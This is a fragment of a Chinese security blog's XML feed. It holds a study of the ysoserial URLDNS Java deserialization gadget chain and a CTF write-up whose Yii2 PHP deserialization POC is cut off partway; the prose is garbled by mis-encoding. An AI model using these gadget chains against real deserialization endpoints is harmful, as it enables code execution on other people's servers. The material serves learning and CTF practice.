Javaå®‰å…¨æ¼«è°ˆ</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;çœ‹å®ŒURLDNSä¹‹åå†çœ‹CCé“¾ï¼Œï¼Œè¿™å°¼ç›ç®€ç›´å°±æ˜¯ä¸€ä¸ªå¤©ä¸€ä¸ªåœ°ã€‚ã€‚å‰å‰ååå¤§æ¦‚çœ‹äº†ä¸‰å››å¤©æ‰èƒ½å‹‰å¼ºè¯´æ˜¯ç†è§£äº†ã€‚ç„¶ååˆèŠ±äº†ä¸¤å¤©å¤šæ¥å†™è¿™ç¯‡æ–‡ç« ã€‚ã€‚æˆ‘æ„Ÿè§‰æˆ‘å°½åŠ›äº†ï¼Œï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæˆ‘çš„æ€ç»´æ–¹å¼è¿˜åœç•™åœ¨phpä¸Šï¼Œæ„Ÿè§‰javaçš„æ–‡ç« çœŸæ˜¯æœ‰ç‚¹éš¾å†™ã€‚ã€‚ã€‚ä¹Ÿè®¸æ˜¯æˆ‘å¤ªæƒ³æŠŠæ¯ä¸ªæµç¨‹è°ƒç”¨éƒ½è´´å‡ºæ¥å§ã€‚ã€‚åé¢æˆ‘ä¼šå­¦ä¹ ä¸‹å¤§ä½¬ä»¬éƒ½æ˜¯æ€ä¹ˆå†™javaæ–‡çš„ã€‚ã€‚è¿™ç¯‡æ–‡ç« å°±å…ˆå°†å°±ç€è¿™æ ·çœ‹å§ï¼Œæˆ‘å°½åŠ›äº†555ã€‚ã€‚ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/categories/java/ysoserial/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/tags/ysoserial/"/>
    
    <category term="CCé“¾" scheme="http://example.com/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>ysoserialå­¦ä¹ ä¹‹ - URLDNS</title>
    <link href="http://example.com/2021/05/12/2021-05-12-ysoserial-urldns/"/>
    <id>http://example.com/2021/05/12/2021-05-12-ysoserial-urldns/</id>
    <published>2021-05-12T09:02:12.000Z</published>
    <updated>2021-05-12T09:20:07.507Z</updated>
    
    <content type="html"><![CDATA[<p>å¤§æ¦‚å­¦äº†ä¸€ä¸ªå¤šæœˆJavaï¼Œæ„Ÿè§‰æœ‰ç‚¹åº•å­äº†ä»¥åï¼Œç»ˆäºå¼€å§‹å­¦ä¹ Javaç›¸å…³æ¼æ´äº†ã€‚æ“æ“æ‰‹ ==</p><p>å¼€ä¸ªysoserialçš„æ–°å‘ã€‚ã€‚æ—¥åæ…¢æ…¢å¡« = =</p><span id="more"></span><br><h1 id="ysoserialåŸºç¡€ä½¿ç”¨"><a href="#ysoserialåŸºç¡€ä½¿ç”¨" class="headerlink" title="ysoserialåŸºç¡€ä½¿ç”¨"></a>ysoserialåŸºç¡€ä½¿ç”¨</h1><p>ç”ŸæˆPOCçš„åœ°æ–¹æ˜¯ <code>GeneratePayload</code>ç±»çš„ main æ–¹æ³•ã€‚</p><br><p>è€Œè°ƒè¯•é“¾å­çš„åœ°æ–¹ä¸º <code>PayloadRunner</code>ç±»ã€‚æ¯ä¸ªPayloadç±»éƒ½ä¼šæœ‰ä¸€ä¸ª mainæ–¹æ³•ï¼Œä¼šè°ƒç”¨ <code>PayloadRunner</code>ç±»çš„ run æ–¹æ³•ã€‚è¯¥æ–¹æ³•ä¼šå°† gadgets åºåˆ—åŒ–åå†ååºåˆ—åŒ–å›æ¥ã€‚ä½¿å¾—æˆ‘ä»¬å¯ä»¥è·Ÿè¿›é“¾å­ã€‚</p><br><h1 id="URLDNS-Poc"><a href="#URLDNS-Poc" class="headerlink" title="URLDNS Poc"></a>URLDNS Poc</h1><p>å®šä½åˆ° ysoserial çš„ <code>URLDNS.java</code>ã€‚æŸ¥çœ‹ <code>getObject()</code> æ–¹æ³•</p><p>ä»¥ä¸‹æ³¨é‡Šä¸ºysoserialæºç çš„æ³¨é‡Šç¿»è¯‘ï¼Œç°åœ¨å¯ä»¥ä¸ç”¨æ·±å…¥ç†è§£ï¼Œåæ–‡ä¼šåˆ†æä¸ºä»€ä¹ˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//ä¸ºäº†é¿å…ç”ŸæˆPayloadæ—¶è§¦å‘åˆ°DNSè§£æï¼Œysoserial è‡ªå®šäº†ä¸€ä¸ª SilentURLStreamHandler ç±»</span></span><br><span class="line">    <span class="comment">//(å…·ä½“ä¸ºä»€ä¹ˆè¿™æ ·åšå°±èƒ½é¿å…ï¼Œä¼šåœ¨åæ–‡åˆ†æã€‚ç°åœ¨å¯æš‚æ—¶ä¸ç®¡)</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">//å°†è¦å­˜æ”¾URLçš„HashMap</span></span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">//ä½œä¸ºHashMap keyå€¼ çš„URL</span></span><br><span class="line">    ht.put(u, url); <span class="comment">//è§¦å‘DNSè§£æçš„å…³é”®åœ¨äºkey(putçš„ç¬¬ä¸€ä¸ªå‚æ•°)ï¼Œvalueæ— æ‰€è°“</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‰§è¡Œäº†ä¸Šé¢çš„put()æ“ä½œï¼ŒURLçš„hashCodeå·²ç»è¢«è®¡ç®—è¿‡å¹¶å­˜åœ¨å˜é‡uä¸­</span></span><br><span class="line">    <span class="comment">//ä½†åªæœ‰è°ƒç”¨äº† hashCode() æ–¹æ³•æ‰ä¼šè¿›è¡ŒDNSè§£æ</span></span><br><span class="line">    <span class="comment">//æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†å…¶hashCodeé‡ç½®ä¸º-1ã€‚å¥½è®©å®ƒä½œä¸ºPayloadæ—¶èƒ½å¤Ÿæ­£å¸¸è°ƒç”¨ hashCode()</span></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ysoserialè‡ªå®šçš„ç±»ã€‚ç»§æ‰¿ URLStreamHandler</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="é…ç½®IDEA"><a href="#é…ç½®IDEA" class="headerlink" title="é…ç½®IDEA"></a>é…ç½®IDEA</h1><p>ç¯å¢ƒï¼šJDK1.8</p><br><p>é…ç½® IDEA çš„ Run/Debug Configurationsï¼šå…ˆè¿è¡Œ URLDNS çš„ <code>main()</code> å‡½æ•°ä½¿ IDEA Configurations è‡ªåŠ¨æ·»åŠ å¯¹åº”çš„é…ç½®ã€‚æ­¤æ—¶ç”±äºæ²¡æœ‰è®¾ç½®å‚æ•°ï¼Œè‚¯å®šä¼šæŠ¥é”™ï¼Œä¸éœ€ç†ä¼šã€‚</p><p>ç„¶åå†è®¾ç½® Program arguments ä¸ºDnslog åœ°å€ï¼š</p><img src="/2021/05/12/2021-05-12-ysoserial-urldns/1.png" width="800px"><p>é…ç½®å®Œæˆåï¼Œå†è¿è¡Œä¸€æ¬¡ URLDNS çš„ <code>main()</code>ï¼ŒæˆåŠŸè§¦å‘DNSè¯·æ±‚</p><img src="/2021/05/12/2021-05-12-ysoserial-urldns/2.png" width="800px"><br><h1 id="è°ƒè¯•ååºåˆ—åŒ–é“¾"><a href="#è°ƒè¯•ååºåˆ—åŒ–é“¾" class="headerlink" title="è°ƒè¯•ååºåˆ—åŒ–é“¾"></a>è°ƒè¯•ååºåˆ—åŒ–é“¾</h1><p>é€šè¿‡æŸ¥çœ‹ ysoserial çš„æ³¨é‡Šå¯ä»¥å¾—çŸ¥ï¼Œæ•´ä¸ªé“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ³¨é‡Šå·²ç»æŠŠé“¾å­å†™çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€è·Ÿè¿›åˆ†æï¼Œä»…è¯´æ˜ä¸€äº›å…³é”®çš„ç‚¹ï¼Œå¹¶è§£å†³ä¸‹åˆçœ‹Pocæ—¶çš„ç–‘æƒ‘ã€‚</p><p><strong>è°ƒè¯•é“¾å­</strong>æ—¶ï¼Œæˆ‘ä»¬ä»…éœ€è¦åœ¨ <code>HashMap.readObject()</code> æ–¹æ³•çš„ <code>putVal()</code> æ“ä½œä¸Šæ‰“ä¸Šæ–­ç‚¹å³å¯è°ƒè¯•ã€‚</p><br><h2 id="å…³é”®ç‚¹1-æœ€ç»ˆè§¦å‘DNSè§£æçš„ä»£ç "><a href="#å…³é”®ç‚¹1-æœ€ç»ˆè§¦å‘DNSè§£æçš„ä»£ç " class="headerlink" title="å…³é”®ç‚¹1-æœ€ç»ˆè§¦å‘DNSè§£æçš„ä»£ç "></a>å…³é”®ç‚¹1-æœ€ç»ˆè§¦å‘DNSè§£æçš„ä»£ç </h2><p>æ¼æ´ç‚¹ä¸º <code>URLStreamHandler.hashCode()</code>ã€‚å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//ä½¿ç”¨äº†getHostAddressè§£æURL</span></span><br><span class="line">    <span class="comment">//è¯¥å‡½æ•°ä¼šæ‰§è¡ŒDNSè¯·æ±‚</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="å…³é”®ç‚¹2-ä¸ºä½•POCé‡ç½®hashCodeä¸º-1"><a href="#å…³é”®ç‚¹2-ä¸ºä½•POCé‡ç½®hashCodeä¸º-1" class="headerlink" title="å…³é”®ç‚¹2-ä¸ºä½•POCé‡ç½®hashCodeä¸º-1"></a>å…³é”®ç‚¹2-ä¸ºä½•POCé‡ç½®hashCodeä¸º-1</h2><p>gadgets çš„æœ€åä¸€ä¸ªæ–¹æ³•ä¸º <code>URL.hashCode()</code>ã€‚çœ‹ä¸€ä¸‹è¿™ä¸ªç±»å’Œæ–¹æ³•çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">URL</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">transient</span> URLStreamHandler handler;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;</span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€šè¿‡è¿™ä¸€è¡Œä»£ç ï¼Œæ‰ä¼šè°ƒç”¨åˆ°æ¼æ´ç‚¹</span></span><br><span class="line">        hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼ŒURLç±»çš„ hashCodeå±æ€§ å¹¶æ—  <code>transient</code> ä¿®é¥°ï¼Œä¸”è‹¥ <code>hashCode()</code> ä¸­ URLç±» çš„ <code>hashCode</code> å€¼ä¸ä¸º -1 å°†ä¼šç›´æ¥ <code>return</code>ï¼Œæ— æ³•æ‰§è¡Œåˆ°è·³æ¿ <code>handler.hashCode(this)</code></p><p>è€Œåœ¨Pocçš„ä»£ç ä¸­ï¼Œæ‰§è¡Œäº†è¿™æ ·çš„æ“ä½œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler);</span><br><span class="line">ht.put(u, url); <span class="comment">//keyä¸ºURLç±»çš„u</span></span><br></pre></td></tr></table></figure><p>è·Ÿè¿› <code>put()</code> æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap</span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//å¯¹keyè°ƒç”¨äº†hash()æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">------</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">//è°ƒç”¨äº†keyçš„hashCode()æ–¹æ³•</span></span><br><span class="line"><span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›åå¯å‘ç°ï¼Œåœ¨ç”ŸæˆPayloadè¿™ä¸€æ­¥æ—¶å°±ä¼šè°ƒç”¨URLçš„ <code>hashCode()</code>ï¼Œä½¿å¾—è¿™ä¸ªkeyå€¼çš„hashCodeå±æ€§ä¸ä¸º-1ã€‚è¿™æ ·çš„æ•°æ®è¢«åºåˆ—åŒ–åå†ååºåˆ—åŒ–å›å»æ—¶ï¼Œç”±äºURL hashCodeå±æ€§ä¸ä¸º-1ï¼Œå°†æ— æ³•æ‰§è¡Œåˆ°è·³æ¿ <code>handler.hashCode(this)</code></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ POCä¸­ æ‰§è¡Œå®Œ <code>Hashmap.put()</code> åï¼Œæ‰‹åŠ¨å°† hashCodeå€¼ è¿˜åŸæˆ-1ï¼ˆç”¨åå°„æ˜¯å› ä¸ºhashCodeæ˜¯privateä¿®é¥°çš„ï¼‰ï¼Œç¡®ä¿Payloadè¢«ååºåˆ—åŒ–åèƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œåˆ°è·³æ¿ã€‚</p><br><h2 id="å…³é”®ç‚¹3-è‡ªå®šä¹‰äº†ä¸€ä¸ªç»§æ‰¿URLStreamHandlerçš„ç±»"><a href="#å…³é”®ç‚¹3-è‡ªå®šä¹‰äº†ä¸€ä¸ªç»§æ‰¿URLStreamHandlerçš„ç±»" class="headerlink" title="å…³é”®ç‚¹3 - è‡ªå®šä¹‰äº†ä¸€ä¸ªç»§æ‰¿URLStreamHandlerçš„ç±»"></a>å…³é”®ç‚¹3 - è‡ªå®šä¹‰äº†ä¸€ä¸ªç»§æ‰¿URLStreamHandlerçš„ç±»</h2><p>è·Ÿè¿‡é“¾å­å°±çŸ¥é“ï¼Œæœ€ç»ˆæ˜¯ <code>URLStreamHandler</code>ç±»è§¦å‘çš„Dnsè¯·æ±‚ã€‚è€ŒPOCä¸­ä½¿ç”¨äº†å¤šæ€çš„æ–¹å¼æ¥ new ä¸€ä¸ª URLStreamHandlerç±»ã€‚ä¸ºä½•å¦‚æ­¤ï¼Ÿ</p><p>æ ¹æ®æ³¨é‡Šå¯çŸ¥ï¼ŒPOCä½œè€…ä¸å¸Œæœ›åœ¨ç”ŸæˆPOCçš„æ—¶å€™ä¼šæ‰§è¡ŒDnsè¯·æ±‚ã€‚å†æ ¹æ®ä¸Šæ–‡å…³é”®ç‚¹2å¯çŸ¥ï¼Œç”ŸæˆPocçš„æ—¶å€™ä¼šè°ƒç”¨ <code>URL.hashCode()</code>ï¼Œç¬¬ä¸€æ¬¡ç”ŸæˆPayloadæ—¶ <code>URLStreamHandler</code>çš„ hashCodeè‚¯å®šæ˜¯-1ï¼Œé“å®šä¼šæ‰§è¡Œåˆ°æœ€åçš„Dnsè¯·æ±‚ä»£ç ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ã€‚POCä½œè€…ä½¿ç”¨äº†å¤šæ€çš„æ–¹å¼ï¼Œè‡ªå®šä¹‰ç»§æ‰¿ <code>URLStreamHandler</code> çš„ç±» <code>SilentURLStreamHandler</code>ï¼Œå¹¶é‡å†™å…¶å…³é”®æ–¹æ³• <code>getHostAddress()</code>ï¼Œè¿™æ ·åœ¨è¿è¡ŒPocæ—¶åªä¼šè°ƒç”¨åˆ° <code>SilentURLStreamHandler</code>çš„<code>getHostAddress()</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//new è°å°±ç”¨è°çš„æ–¹æ³•</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å•¥ä¹Ÿæ²¡å¹²çš„ getHostAddress()</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>ã€ä»£ç å®¡è®¡ã€‘çŸ¥è¯†æ˜Ÿçƒ - Javaå®‰å…¨æ¼«è°ˆ</p><p><a href="https://xz.aliyun.com/t/9417#toc-2">https://xz.aliyun.com/t/9417#toc-2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤§æ¦‚å­¦äº†ä¸€ä¸ªå¤šæœˆJavaï¼Œæ„Ÿè§‰æœ‰ç‚¹åº•å­äº†ä»¥åï¼Œç»ˆäºå¼€å§‹å­¦ä¹ Javaç›¸å…³æ¼æ´äº†ã€‚æ“æ“æ‰‹ ==&lt;/p&gt;
&lt;p&gt;å¼€ä¸ªysoserialçš„æ–°å‘ã€‚ã€‚æ—¥åæ…¢æ…¢å¡« = =&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/categories/java/ysoserial/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="URLDNS" scheme="http://example.com/tags/URLDNS/"/>
    
    <category term="ysoserial" scheme="http://example.com/tags/ysoserial/"/>
    
  </entry>
  
  <entry>
    <title>CTFç©è€ç³»åˆ—[3] - [çº¢å¸½æ¯2021] WEB2 &amp;&amp; WEB4</title>
    <link href="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/"/>
    <id>http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/</id>
    <published>2021-05-10T14:49:01.000Z</published>
    <updated>2021-05-10T15:47:31.457Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©è¢«æˆ‘äº²çˆ±çš„å°æ°æ°å’Œå¸ˆå¼Ÿæ‹‰å»ç©è€äº†ä¸€æ³¢çº¢å¸½æ¯ã€‚ã€‚æ¥å†™ä¸‹wpåšä¸ªå°è®°å½•ã€‚</p><p>è¿™æ¬¡è¿˜æ˜¯åªè§£å‡ºæ¥ä¸€é¢˜WEB2ï¼Œï¼Œè€åºŸç‰©äº†ã€‚ã€‚ã€‚ã€‚</p><p>æœ€è¿‘æ²¡å’‹æ›´åšå®¢ã€‚ã€‚å› ä¸ºæ–‡ç« éƒ½å‘åˆ°å®‰å…¨å®¢ä¸Šæ··ç‚¹é›¶èŠ±é’±ç”¨äº†ã€‚ã€‚ã€‚= =</p><span id="more"></span><br><h1 id="WEB2-Yii2ååºåˆ—åŒ–"><a href="#WEB2-Yii2ååºåˆ—åŒ–" class="headerlink" title="WEB2 - Yii2ååºåˆ—åŒ–"></a>WEB2 - Yii2ååºåˆ—åŒ–</h1><p>è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿä¸¤ä¸ªä¸œè¥¿å§ï¼šYii2ååºåˆ—çš„é“¾å­ åŠ Apache mod_cgi bypass disable_functions</p><br><p>é¦–å…ˆæ‰¾å…¥å£ç‚¹ï¼Œæ¯”èµ›å¹³å°ç»™çš„æ§åˆ¶å™¨ä¸º  <code>/controllers/SiteController.php</code> ã€‚</p><p>æ‰¾åˆ°ååºåˆ—åŒ–çš„å…¥å£ç‚¹ <code>actionAbout()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionAbout</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&#x27;Hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = base64_decode(<span class="variable">$message</span>);</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æ¸…æ¥šè·¯ç”±çš„ï¼Œçœ‹åˆ°é¡µé¢ä¸Šçš„ <strong>â€œAboutâ€ æŒ‰é’®</strong>ï¼Œç‚¹è¿‡å»å°±æ˜¯äº†ã€‚</p><br><p>ååºåˆ—åŒ–POCï¼Œè¿™é‡Œå°±ä¸ç»†ç»†åˆ†æäº†ï¼Œè¯¦æƒ…å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™äº›æ–‡ç« ï¼š</p><p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p><p><a href="https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg">https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//æ‰§è¡Œçš„å‡½æ•°</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="comment">//å‡½æ•°å‚æ•°</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;999&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    